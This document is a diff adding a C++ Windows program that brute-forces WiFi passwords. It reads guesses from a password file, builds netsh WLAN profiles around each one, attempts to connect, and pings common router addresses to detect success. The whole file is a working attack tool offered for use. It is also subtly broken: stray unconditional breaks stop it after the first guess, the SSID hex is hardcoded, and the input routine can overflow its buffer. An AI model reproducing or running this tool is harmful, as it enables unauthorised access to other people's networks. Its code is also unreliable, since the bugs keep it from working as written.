@@ -1,0 +1,93 @@
+﻿#include <iostream>
+#include <fstream>
+#include <conio.h>
+#include <Windows.h>
+using namespace std;
+void name(char* name) {
+	int i(0);
+	char c;
+	cin.get(c);
+	while (c != '\n') {
+		name[i] = c;
+		i++;
+		cin.get(c);
+	}
+	name[i] = '\0';
+}
+
+int main()
+{
+	setlocale(LC_ALL, "rus");
+	char name1[20];
+	char name2[20];
+	ofstream fout;
+	system("netsh wlan show networks");
+	cout << "введите имя сети wifi\n\n";
+	name(name1);
+	cout << "\nвведите название защиты\nWPAPSK, WPA2PSK\n\n";
+	name(name2);
+	cout << "\nвведите задержку перед проверкой соединения\nрекомендованно 10000\n\n";
+	int name3 = 0;
+	cin >> name3;
+	int l = 1;
+	int l1 = 1;
+	int l2 = 1;
+	ifstream filestr;
+	char password[16];
+		filestr.open("pass.txt");
+		int index = -1;
+		do {
+			index++;
+			filestr.getline(password, 16);
+			cout << endl << password << endl << endl;
+			SetConsoleCP(CP_UTF8);
+			fout.open("broot.xml");
+			SetConsoleCP(CP_UTF8);
+			fout << "<?xml version=\"1.0\"?>" << endl;
+			fout << "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">" << endl;
+			fout << "<name>" << name1 << "</name>" << endl;
+			fout << "<SSIDConfig>" << endl;
+			fout << "<SSID>" << endl;
+			fout << "<hex>5452454E446E6574363531</hex>" << endl;
+			fout << "<name>" << name1 << "</name>" << endl;
+			fout << "</SSID>" << endl;
+			fout << "</SSIDConfig>" << endl;
+			fout << "<connectionType>ESS</connectionType>" << endl;
+			fout << "<connectionMode>manual</connectionMode>" << endl;
+			fout << "<MSM>" << endl;
+			fout << "<security>" << endl;
+			fout << "<authEncryption>" << endl;
+			fout << "<authentication>" << name2 << "</authentication>" << endl;
+			fout << "<encryption>AES</encryption>" << endl;
+			fout << "<useOneX>false</useOneX>" << endl;
+			fout << "</authEncryption>" << endl;
+			fout << "<sharedKey>" << endl;
+			fout << "<keyType>passPhrase</keyType>" << endl;
+			fout << "<protected>false</protected>" << endl;
+			fout << "<keyMaterial>" << password << "</keyMaterial>" << endl;
+			fout << "</sharedKey>" << endl;
+			fout << "</security>" << endl;
+			fout << "</MSM>" << endl;
+			fout << "<MacRandomization xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v3\">" << endl;
+			fout << "<enableRandomization>false</enableRandomization>" << endl;
+			fout << "</MacRandomization>" << endl;
+			fout << "</WLANProfile>";
+			fout.close();
+			int prover;
+			prover = system("netsh wlan add profile filename=\"broot.xml\"");
+			if (prover > 0) system("pause");
+			char a[40] = "netsh wlan connect ";
+			strcat_s(a, name1);
+			prover = system(a);
+			if (prover > 0) system("pause");
+			Sleep(name3);
+			l = system("ping 192.168.10.1 -n 1");
+			if (l == 0)break; break;
+			l1 = system("ping 192.168.1.1 -n 1");
+			if (l1 == 0)break; break;
+			l2 = system("ping 192.168.0.1 -n 1");
+			if (l2 == 0)break; break;
+		} while (!filestr.eof());
+	cout << "\nlast password " << password << endl;
+	_getch();
+}
